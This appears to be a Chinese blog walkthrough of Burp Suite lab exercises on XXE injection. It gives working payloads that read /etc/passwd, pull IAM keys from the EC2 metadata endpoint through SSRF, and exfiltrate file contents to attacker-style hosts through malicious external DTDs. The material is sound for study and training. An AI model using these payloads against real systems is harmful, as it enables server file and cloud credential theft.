#  【burpsuite靶场-服务端】XXE注入漏洞   
原创 underatted  泷羽Sec-underatted安全   2025-02-11 07:42  
  
# XML外部实体（XXE）注入  
  
在本节中，我们将解释什么是 XML外部实体注入，描述一些常见的示例，解释如何发现和利用各种 XXE 注入，并总结如何防止 XXE 注入攻击。  
# 1. 什么是XML外部实体注入？  
  
XML外部实体注入（也称为XXE）是一个 Web 安全漏洞，它允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者 查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端 或 外部系统进行交互。  
  
在某些情况下，攻击者可以利用 XXE 漏洞执行服务端请求伪造（SSRF）攻击，从而升级 XXE 攻击来危害底层服务器或其他后端基础设施。  
  
![Not Found Image](https://mmbiz.qpic.cn/mmbiz_svg/WAibKjHvK5nHQFWCQKkicQ8c17kIThhXK09fl70exBmgvQBiaG2EP15eFDQ6AIFmzTmQUdyLA47nIYdwn7Mjmiax5IwSaUSb1Mgs/640?wx_fmt=svg&from=appmsg "")  
  
Not Found Image  
## 1.1 什么是XML？  
  
XML 表示 “可扩展标记语言（Extensible Markup Language）” 。XML 是一种专门设计并用于存储和传输数据的语言。  
- 与 HTML 的共同点，XML 使用标签和数据的树状结构。  
  
- 与 HTML 的不同点，XML 不使用预定义的标签，因此，可以随意地为标签指定描述数据的名称。（XML标签的 数据和名称 都可以自定义）  
  
在 Web 历史的早期，XML 作为一种数据传输格式 使其非常流行（“AJAX” 中的 “X” 代表 “XML”）。但它的流行程度现在已经下降，取而代之的是 JSON 格式。  
## 1.2 什么是XML实体？  
  
XML 实体是在 XML 文档中表示数据项的一种方式，而不是数据本身。XML 语言的规范中内置了各种实体。例如，实体&lt;  
和&gt;  
表示字符<  
和>  
。这两个字符是用于表示 XML 标记的元字符，因此当它们出现在数据中时，通常必须使用它们的实体形式来表示。  
## 1.3 什么是文档类型定义？  
  
XML文档类型定义（DTD）具有各种声明规则，它可以定义 XML 文档结构、文档内包含的数据值类型 等其他选项。DTD 在 XML 文档开头的DOCTYPE  
元素中声明，该元素是可选的。  
- DTD 可以完全包含在文档本身当中（称为 “内部DTD”）；  
  
- 也可以从其他位置加载（称为 “外部DTD”）；  
  
- 也可以是两者的混合。  
  
## 1.4 什么是XML自定义实体？  
  
XML 允许你在 DTD 中创建自己的实体。例如：  
```
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>

```  
  
此定义意味着，在 XML 文档中对&myentity;  
实体的任何引用，都将替换为定义的值："my entity value"  
。  
## 1.5 什么是XML外部实体？  
  
从文档外部加载自定义的 XML 实体，有点像 PHP 中的远程文件包含  
  
XML 外部实体是一种自定义的实体，它的具体定义 位于声明它们的 DTD 外部。  
  
外部实体的声明使用SYSTEM  
关键字，并且必须指定一个 URL，文档会从该 URL 加载实体的值。例如：  
```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>

```  
  
URL 可以使用file://  
协议，因此可以从文件中加载外部实体。例如：  
```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

```  
  
XML 外部实体成为了  
XML 外部实体攻击 (opens new window)  
的主要手段。  
# 2.XXE漏洞是如何产生的？  
  
一些应用程序使用 XML 格式在浏览器和服务器之间传输数据。执行此操作的应用程序，几乎总是使用标准库或平台 API 来处理服务器上的 XML 数据。XXE 漏洞的出现，是因为 XML 规范中包含各种潜在的危险特性，而标准解析器支持这些特性，即使应用程序通常不会用到这些特性及功能。  
  
XML 外部实体是一种自定义的 XML 个体，其定义的值是从声明它们的 DTD 外部加载的。从安全角度来看，外部实体特别有趣，因为它们允许 “基于文件路径或 URL 的内容” 来定义实体。  
# 3.XXE攻击有哪些类型？  
  
有各种类型的 XXE 攻击：  
- 利用 XXE 检索文件 (opens new window)  
，其中定义了 包含文件内容 的外部实体，并在应用程序的响应中返回。  
  
- 利用 XXE 执行 SSRF 攻击 (opens new window)  
，其中，外部实体是根据后端系统的 URL 来定义的。  
  
- 利用盲 XXE 实现带外泄露数据 (opens new window)  
，其中，敏感数据从应用程序服务器 传输到 攻击者控制的系统上。  
  
- 利用盲 XXE 的错误消息来检索数据 (opens new window)  
，其中，攻击者可以触发 包含敏感数据 的错误消息解析。  
  
# 4.利用XXE检索文件  
  
想要执行 XXE 注入攻击 并 从服务器文件系统中检索任意文件，你需要通过两种方式修改提交的 XML：  
- 引入（或编辑）一个DOCTYPE  
元素，该元素定义了包含文件路径的外部实体。  
  
- 编辑应用程序响应中返回的 XML 数据值，以使用定义的外部实体。  
  
例如，假设有一个购物应用程序，它向服务器提交以下 XML 来检查产品的库存情况：  
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>

```  
  
该应用程序不会对 XXE 攻击执行任何特定的防御措施，因此你可以利用 XXE 漏洞，提交以下有效负载来检索/etc/passwd  
文件：  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

```  
1. **<!DOCTYPE foo>**  
:  
  
1. 这是一个文档类型声明，定义了文档类型为 foo  
。  
  
1. 在XML中，<!DOCTYPE>  
 用于声明文档类型，通常用于关联文档与DTD（文档类型定义）。  
  
1. **[ ]**  
:  
  
1. 这部分定义了内部子集（Internal Subset），用于在文档中定义实体或其他内容。  
  
1. **<!ENTITY xxe SYSTEM "file:///etc/passwd">**  
:  
  
1. 定义了一个名为 xxe  
 的外部实体。  
  
1. SYSTEM  
 关键字指定了实体的来源是一个外部系统资源。  
  
1. "file:///etc/passwd"  
 是一个URI，指向本地文件系统中的 /etc/passwd  
 文件。  
  
这个 XXE 负载定义了一个外部实体&xxe;  
，它的值是/etc/passwd  
文件的内容，并将值传递给productId  
值中的实体。这会导致 在应用程序的响应中包含文件内容：  
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

```  
  
对于真实的 XXE 漏洞，提交的 XML 中通常存在大量的数据值，其中任何一个值 都可能在应用程序的响应中回显。要系统地测试 XXE 漏洞，通常需要单独测试 XML 中的每个数据节点，方法是 使用定义的实体并查看它是否出现在响应中。  
## 实验1：普通XXE-文件检索  
  
**实验目标：**  
- 此实验室具有一个 “Check stock（库存检查）” 功能，它可以解析 XML 输入并在响应中返回任何意外的值。  
  
- 若要解决实验室问题，请注入一个 XML 外部实体来检索/etc/passwd  
文件的内容。  
  
将productId编号替换为对外部实体的引用：  
```
&xxe;

```  
  
访问一个产品页面，点击"检查库存"，并在Burp Suite中拦截由此产生的POST请求，发送到repeater![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjleJce6X54kCibnudRczIwibSy3ticscwYRhJBJbE2jVncItachbdl55xeg/640?wx_fmt=png&from=appmsg "")  
  
  
在XML声明和stockCheck元素之间插入以下外部实体定义：  
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

```  
  
将productId编号替换为对外部实体的引用：  
```
&xxe;

```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlicaBbffJSBYic7JlrFJciaXqNic350XZY2b0jXS7XB9YKQQUDTzRmJDMrg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
# 5.利用 XXE 执行 SSRF 攻击  
  
除了检索敏感数据之外，XXE 攻击的另一个主要影响是，它们可用于执行服务端请求伪造（SSRF）。这是一个潜在的严重漏洞，它可以诱导服务器端应用程序 向 服务器可以访问的任何 URL 发出 HTTP 请求。  
  
若要利用 XXE 漏洞执行  
SSRF攻击 (opens new window)  
，你需要针对目标 URL 来定义外部 XML 实体，并在数据值中使用定义好的实体。如果你可以在 具有回显的数据值中 使用定义的实体，则你可以在应用程序的响应中查看来自 URL 的响应，从而获得与后端系统的双向交互。如果没有回显，你就只能进行  
盲SSRF (opens new window)  
攻击（这仍然可能产生严重后果）。  
  
在下面的 XXE 示例中，外部实体将导致服务器 向 组织基础设施中的内部系统发出后端 HTTP 请求：  
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

```  
## 实验2：普通XXE-执行SSRF攻击  
  
**实验目标：**  
- 此实验室具有一个 “Check stock（库存检查）” 功能，它可以解析 XML 输入并在响应中返回任何意外的值。  
  
- 实验室服务器在默认的 URL 上面运行了一个模拟的 EC2 元数据端点，地址是http://169.254.169.254/  
。此端点可用于检索有关实例的数据，其中一些数据可能是敏感的。  
  
- 若要解决实验室问题，请利用 XXE 漏洞执行 SSRF 攻击，并从 EC2 元数据端点中获取服务器的 IAM 访问密钥（SecretAccessKey）。  
  
抓包，修改，重放  
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>

```  
  
显示无效的id latest![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlJMXlmD3chhbe8Y8AwRoGWyOYWm31kYFa4zHfI4IwTAUlTcpApAsGbQ/640?wx_fmt=png&from=appmsg "")  
加路径latest，提示无效id meta-data![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjliaX9OlOVuLeu3Kgo325tYPUEOtCqZuLACJH3evrjLAIuzDPZe7z7AyA/640?wx_fmt=png&from=appmsg "")  
继续加iam![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlopCRImIHuGjAvibDn80obcCPtZK9GiczicicFZawa3ogr4ibQJsNibjhib0xw/640?wx_fmt=png&from=appmsg "")  
最后构造完成，得到key![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlHmoQW1FDiaic16CQQuMx78PWLwcicTicHXtNttmH1Tah3KlfUoUsia2UxdQ/640?wx_fmt=png&from=appmsg "")  
  
# 6.寻找并利用盲 XXE 漏洞  
## 6.1 简述（查找和利用隐蔽的XXE漏洞）：  
1. XXE漏洞的许多实例是盲目的。这意味着应用程序不会在其响应中返回任何已定义的外部实体的值，因此不可能直接检索服务器端文件。  
  
1. 盲XXE漏洞仍然可以检测和利用，但需要更先进的技术。有时可以使用带外技术来查找漏洞，并利用它们来泄漏数据。有时候，可能会触发XML解析错误，从而导致在错误消息中泄漏敏感数据。  
  
## 6.2 XXE盲注  
1. Blind XXE漏洞出现在应用程序易受攻击的地方XXE注射液但不在其响应内返回任何定义的外部实体的值。这意味着直接检索服务器端文件是不可能的，因此盲XXE通常比常规XXE漏洞更难被利用。  
  
1. 可以通过两种广泛的方式查找和利用隐蔽的XXE漏洞： 1、触发带外网络交互，有时会在交互数据中泄漏敏感数据。 2、通过错误消息包含敏感数据的方式触发XML解析错误。  
  
1. 使用带外技术 1、通常可以使用与XXE SSRF攻击相同的技术来检测XXE盲注，但会触发与控制的系统的带外网络交互。 例如，可按如下方式定义外部：  
  
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>

将在XML中的数据值中使用定义的实体

```  
  
此XXE攻击使服务器向指定URL发出后端HTTP请求。攻击者可以监视生成的DNS查找和HTTP请求，从而检测到XXE攻击成功。  
### 实验3：盲XXE-带外交互  
  
**实验目标：**  
- 此实验室具有一个 “Check stock（库存检查）” 功能，它可以解析 XML 输入，但不会显示结果，你可以通过触发与外部域的带外交互来检测盲 XXE 漏洞。  
  
- 若要解决实验室问题，请使用**外部实体**  
使 XML 解析器向 Burp Collaborator 发出 DNS 查找和 HTTP 请求。  
  
检查库存，抓包，在collaborator复制一个域，修改，重放  
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://p2scgyvsl9lyro45tce67jmk5bb2ztni.oastify.com"> ]>

```  
  
成功![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlSutDu26czLsPcmxSwCyHzhstict30lDo7ImavFaSOWdVeU6gMFEVD3A/640?wx_fmt=png&from=appmsg "")  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlVXpu39hZicHN1nQyTPD1fSNacjmL78SCrTfOrkWdicAkfT9h7pGqnaTw/640?wx_fmt=png&from=appmsg "")  
  
1. 一般使用常规实体的XXE攻击会被阻止，因为应用程序进行了一些输入验证，或者使用的XML解析器进行了一些加固。在这种情况下，可以改用XML参数实体。  
  
XML参数实体是一种特殊类型的XML实体，只能在DTD中的其他位置引用  
1. XML参数实体的声明在实体名称前包含百分比字符：  
  
```
<!ENTITY % myparameterentity "my parameter entity value" >

```  
1. 使用%百分比字符而不是通常的&号引用参数实体：  
  
```
%myparameterentity;

```  
1. XML参数实体使用带外检测来测试盲XXE：  
  
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

```  
### 实验4：通过XML参数实体进行带外交互的盲XXE  
  
**实验目标：**  
- 此实验室具有一个 “Check stock（库存检查）” 功能，它可以解析 XML 输入，但不显示任何意外值，并阻止包含常规外部实体的请求。  
  
- 若要解决实验室问题，请使用**参数实体**  
使 XML 解析器向 Burp Collaborator 发出 DNS 查找和 HTTP 请求。  
  
抓包，修改 以 “参数实体” 的形式重新构造攻击载荷：  
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://0bcnp943uku90zdg2nnhguvvemkd85wu.oastify.com"> %xxe; ]>

```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlJpgLgckTXIaQyDkDy2luAT4G5hA6XbNcouz0QgcmhCMvAEUu5OticEg/640?wx_fmt=png&from=appmsg "")  
切换至 Collaborator 选项卡，等待一会儿，可以看到域的 DNS/HTTP 信息，说明带外交互成功。![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlWk8ibExezGQaVn25lRiafCYeOhcyicXf24an9VqgC39ibuHdibXWMwS0Q6g/640?wx_fmt=png&from=appmsg "")  
“实体” 与 “参数实体” 之间有什么区别？  
- 上图为“实体”  
  
- 下图为“参数实体”  
  
1、定义的语法有所不同  
- “实体” 是默认的定义语法  
  
- “参数实体” 使用了默认的语法，但，在每个实体的前方，都要添加一个符号%  
  
2、调用实体的方式不同  
- “实体” 需要在某个 XML 参数中进行调用，使用符号&  
进行调用  
  
- “参数实体” 的调用紧跟在定义的后方，使用符号%  
进行调用  
  
## 6.3 利用盲 XXE 从带外提取数据  
1. 通过带外技术检测一个隐蔽的XXE漏洞是非常好的，但它实际上并不能证明该漏洞是如何被利用的。攻击者真正想要实现的是泄露敏感数据。这可以通过隐蔽的XXE漏洞实现，但它涉及攻击者在其控制的系统上托管恶意DTD，然后从带内XXE有效负载内调用外部DTD。  
  
1. 一个恶意DTD的示例，该DTD可用于泄漏/etc/passwd文件的内容：  
  
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

```  
  
此DTD执行以下步骤： 1、定义名为的XML参数实体file，包含的内容/etc/passwd文件。 2、定义名为的XML参数实体eval，包含另一个XML参数实体的动态声明，该实体名为exfiltrate。该exfiltrate将通过向攻击者的Web服务器发出包含file URL查询字符串中的实体。 3、使用eval实体的动态声明，它将导致exfiltrate要执行的实体。 4、使用exfiltrate实体，以便通过请求指定的URL来计算其值。  
  
然后攻击者必须在他们控制的系统上托管恶意DTD，通常是将其加载到自己的Web服务器上。  
  
例如，攻击者可能在以下URL提供恶意DTD：  
```
http://web-attacker.com/malicious.dtd

```  
  
3、最后攻击者必须向易受攻击的应用程序提交以下XXE有效负载：  
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>

```  
  
4、这个XXE有效负载声明了一个名为xxe的XML参数实体，然后在DTD中使用该实体。这将导致XML解析器从攻击者的服务器获取外部DTD并内联解释它。然后执行恶意DTD中定义的步骤，并将/etc/passwd文件传输到攻击者的服务器。  
  
5、此技术可能不适用于某些文件内容，包括/etc/passwd文件中包含的换行符。因为一些XML解析器使用API来获取外部实体定义中的URL，该API验证允许出现在URL中的字符。在这种情况下，可以使用FTP协议代替HTTP。有时无法过滤包含换行符的数据，因此可以将目标改为/etc/hostname之类的文件  
### 实验5：盲XXE-外部DTD  
  
**实验目标：**  
- 此实验室具有一个 “Check stock（库存检查）” 功能，它可以解析 XML 输入，但不会显示结果。  
  
- 若要解决实验室问题，请泄露/etc/hostname  
文件的内容。  
  
将请求数据包转发至 Repeater 功能模块，尝试注入经典的 XML 外部实体，实体被禁止使用。![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlMTxZZZJUZ2a3t0pFmJUdhlcpZupO25ia7t8qwSdPBr4nXxVgeOvfUgA/640?wx_fmt=png&from=appmsg "")  
  
  
以 “参数实体” 的形式重新构造攻击载荷，并尝试触发带外交互：  
```
<!DOCTYPE abc [ <!ENTITY % carsaid SYSTEM "http://你的域"> %carsaid; ]>

```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlQe6I07rnu1mDjFBXd5Me8ZXkB5OgmKyLFXicPMX8fsEtzpI1ic38EVzQ/640?wx_fmt=png&from=appmsg "")  
成功![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlWxhicwmjxLgYW3F4szvHV2wCN3ibG9DgjnRtQuhhLbtoriaF6HunUdeBA/640?wx_fmt=png&from=appmsg "")  
  
  
重新定义响应内容，以 “参数实体” 的形式构造 XXE 攻击载荷。  
  
该载荷会读取/etc/hostname  
的文件内容，然后将其附加到 URL 参数x  
当中，最后访问该 URL 并传递x  
参数值。 单击"Go to exploit server"（转到利用漏洞服务器）并将恶意DTD文件保存在您的服务器上。  
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://vtsi74mycfc4iuvbki5cypdqwh28q2er.oastify.com/?x=%file;'>">
%eval;
%exfil;

```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlAPjcuVORWA8wDoDUsXwq2OZXybqbDKBiaatZHT45zboL0QvdicjSHNmQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlHBTYzyFXgp7H5dI5G2tRsDeah8CRYCgtEzZDL4iauEQBGoy1yfNgj6Q/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
记下URL，回到 BurpSuite ，注入 XML 参数实体，并加载远程 DTD 文件。  
  
（值得注意的是，**实体的名称不能重复**  
，否则会造成冲突）  
```
<!DOCTYPE abc [<!ENTITY % qwe SYSTEM "漏洞利用服务器的域"> %qwe;]>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a96000a03ecc26e8161c51b01cd004b.exploit-server.net/exploit"> %xxe;]>

```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlOQb8FjRj3l5lq3iadwOeAibTNN9ZicRK0eDEQkmxVXAbDOlFHGCk1HYPA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
查看collaborator![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlG5Vq2OQwHWkCo4EUgHtDaDLWCNxDnUia7iavYnf6rWH21OkCQTuljoqg/640?wx_fmt=png&from=appmsg "")  
  
- 该程序先是请求了/exploit  
文件，获取远程 XML 文件的内容，并执行其中的 XML 参数实体。  
  
- 执行的过程中，将/etc/hostname  
的文件内容附加到x  
参数当中，并再次访问/?x=内容  
  
从而造成带外数据泄露，获得主机名。  
## 6.4 利用盲态XXE通过错误消息检索数据  
1. 利用盲XXE的另一种方法是触发XML解析错误，其中错误消息包含希望检索的敏感数据。如果应用程序在其响应中返回结果错误消息，则此操作将有效。  
  
可以触发一条XML分析错误消息，该消息包含/etc/密码文件使用恶意外部DTD：  
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

```  
  
此DTD执行以下步骤：  
```
1、定义名为的XML参数实体file，包含的内容/etc/passwd文件。
2、定义名为的XML参数实体eval，包含另一个XML参数实体的动态声明，该实体名为error。该error将通过加载一个不存在的文件（该文件的名称包含file实体。
3、使用eval实体的动态声明，它将导致error要执行的实体。
4、使用error实体，以便通过尝试加载不存在的文件来计算其值，从而生成包含不存在的文件的名称的错误消息，该文件是/etc/passwd文件。

```  
1. 调用恶意的外部DTD将导致出现如下错误消息：  
  
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

```  
### 实验6：盲XXE-错误消息  
  
**实验目标：**  
- 此实验室具有一个 “Check stock（库存检查）” 功能，它可以解析 XML 输入，但不会显示结果。  
  
- 若要解决实验室问题，请使用外部 DTD 触发错误消息，显示/etc/passwd  
文件的内容。  
  
- 本实验包含一个链接，指向另一个域中的漏洞利用服务器，你可以在该域中托管恶意 DTD 。  
  
上传DTD文件  
  
单击"Go to exploit server"（转到利用漏洞服务器）并将恶意DTD文件保存在您的服务器上。 该载荷会读取/etc/passwd  
的文件内容，然后将其附加到路径/nonexistent/内容  
当中，最后访问该路径。然而在文件系统上，该路径并不存在，所以将会触发一个错误。  
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlhT2CTwa53APJvwpCRhpRtxtbXmUMKBVLR9uOwsjZ7TAS7aGnQTX1pA/640?wx_fmt=png&from=appmsg "")  
XXE注入  
  
在XML声明和stockCheck元素之间插入以下外部实体定义：  
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 
我的是：
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://caqzol3ftwtlzbcs1zmtf6u7dyjp7kv9.oastify.com/exploit"> %xxe;]>

```  
  
成功触发路径错误 “文件没有找到” ，错误信息中包含了/etc/passwd  
文件的内容。![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjl5UeTTswu04y2nLF56AJG7BuuhdZZwGRzRYdia1PsiaF3fqDeibyF4wsYQ/640?wx_fmt=png&from=appmsg "")  
  
# 6.5 通过改变本地DTD的用途来利用盲XXE  
1. 前面的技术可以很好地用于外部DTD，但通常不能用于在文件DOCTYPE元素。因为该技术涉及在另一个参数实体的定义中使用XML参数实体。根据XML规范，这在外部DTD中是允许的，但在内部DTD中不允许。(大多数解析器不会允许）  
  
1. 当带外交互被阻止时，不能通过带外连接泄漏数据，也不能从远程服务器加载外部DTD。在这种情况下，由于XML语言规范中的漏洞，仍然可能触发包含敏感数据的错误消息。如果文档的DTD混合使用内部和外部DTD声明，则内部DTD可以重定义在外部DTD中声明的实体。当发生这种情况时，对在另一个参数实体的定义中使用XML参数实体的限制就会放松  
  
1. 意味着攻击者可以使用基于误差的XXE技术（error-based XXE ），前提是它们使用的XML参数实体是重新定义在外部DTD中声明的实体。当然，如果阻塞了带外连接，则无法从远程位置加载外部DTD。相反，它需要是应用程序服务器本地的外部DTD文件。从本质上讲，攻击涉及调用一个碰巧存在于本地文件系统上的DTD文件，并重新调整其用途，以触发包含敏感数据的解析错误的方式重新定义现有实体。  
  
1. 例如，假设服务器文件系统上的以下位置有一个DTD文件/usr/local/app/schema.dtd，并且此DTD文件定义了一个名为custom_entity。  
  
攻击者可以触发XML解析错误消息，该消息包含/etc/passwd文件，方法是提交如下所示的混合DTD：  
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;'>
%local_dtd;
]>

```  
  
此DTD执行以下步骤： 1、定义名为的XML参数实体local_dtd，包含服务器文件系统上存在的外部DTD文件的内容。 2、重新定义名为custom_entity，它已在外部DTD文件中定义。实体被重新定义为包含基于错误XXE攻击这已经描述过了，用于触发包含/etc/passwd文件。 3、使用local_dtd，以便解释外部DTD，包括custom_entity实体。这将产生所需的错误消息。  
1. 查找要重新使用的现有DTD文件  
  
由于这种XXE攻击涉及到改变服务器文件系统上现有DTD的用途，因此关键的要求是找到合适的文件。这其实很简单。因为应用程序返回XML解析器抛出的任何错误消息，所以只需尝试从内部DTD中加载本地DTD文件，就可以轻松地枚举这些文件。  
  
例如，使用GNOME桌面环境的Linux系统通常在/usr/share/yelp/dtd/docbookx.dtd中有一个DTD文件。可以通过提交以下XXE有效负载来测试此文件是否存在，如果文件丢失，则会导致错误：  
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>

```  
### 实验9：利用XXE通过改变本地DTD的用途来检索数据  
  
**实验目标：**  
- 此实验室具有一个 “Check stock（库存检查）” 功能，它可以解析 XML 输入，但不会显示结果。  
  
- 若要解决实验室问题，请触发包含/etc/passwd  
文件内容的错误消息。  
  
- 你需要引用服务器上的现有 DTD 文件，并从中重新定义实体。  
  
- 提示 使用 GNOME 桌面环境的系统通常有一个自带的 DTD 文件，位于/usr/share/yelp/dtd/docbookx.dtd  
，其中包含一个名为ISOamso  
的实体。  
  
根据题目中的提示，构造 XML 参数实体，尝试访问文件/usr/share/yelp/dtd/docbookx.dtd  
。  
```
<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %xxe; ]>

```  
  
程序没有返回任何信息![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlvHRXSaRVia4b6UFBYtcaF1brZ8Gdt3nCq1Ft5XKcI3V352D0ZeiasHew/640?wx_fmt=png&from=appmsg "")  
删除一个字符，出现报错，证明文件存在![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlwA2HibnCq4yOWYChxn5RicvAzsZiaz5aIYwfeunic2lic1dgqPJrpFia6P2A/640?wx_fmt=png&from=appmsg "")  
  
  
造攻击载荷，重写本地 DTD 文件中的ISOamso  
实体，尝试读取/etc/passwd  
文件。  
```
<!DOCTYPE xyz [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///aaabbbccc/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;'>
%local_dtd;
]>

```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jv7IhtdDp3p56tsRxYaxUjlWMzIfKhpe9HgpTgV4WAlaxh3Z3uVniabyV6icWApp9VYkhV4ZIibPw1RQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
- 定义一个名为local_dtd  
的 XML 参数实体，它加载本地 DTD 文件的内容。  
  
- 重新定义名为ISOamso  
的 XML 参数实体，该实体先前已经在本地 DTD 文件中定义。但在此处，该实体被重新定义为恶意的攻击载荷，用于触发错误消息，并包含/etc/passwd  
文件的内容。  
  
- 使用local_dtd  
实体，解析外部 DTD 并覆盖ISOamso  
实体的定义值，这将产生预期的错误消息。  
  
```
&#x25;  --解码-->  %
&#x26;  --解码-->  &
&#x27;  --解码-->  '

一次解码后的攻击载荷：

<!DOCTYPE xyz [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '    <!ENTITY % file SYSTEM "file:///etc/passwd">    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///aaabbbccc/%file;'>">    %eval;    %error;  '>
%local_dtd;
]>

```  
# 7. 寻找XXE注入的隐藏攻击面  
  
在许多情况下，XXE 注入漏洞的攻击面很明显，因为应用程序的正常 HTTP 流量中包含 XML 格式数据的请求。但在其他情况下，攻击面不太明显。然而，如果查找到了正确的位置，则会在不包含任何 XML 的请求中找到 XXE 攻击面。  
## 7.1 XInclude攻击  
  
SOAP 是基于 XML 的简易协议，可用于访问网络服务，使应用程序在 HTTP 之上进行信息交换。 -   
菜鸟教程 (opens new window)  
1. 一些应用程序接收客户端提交的数据，在服务器端将其嵌入到XML文档中，然后解析该文档。当客户端提交的数据被放入后端SOAP请求中，然后由后端SOAP服务处理时，就会出现这种情况。  
  
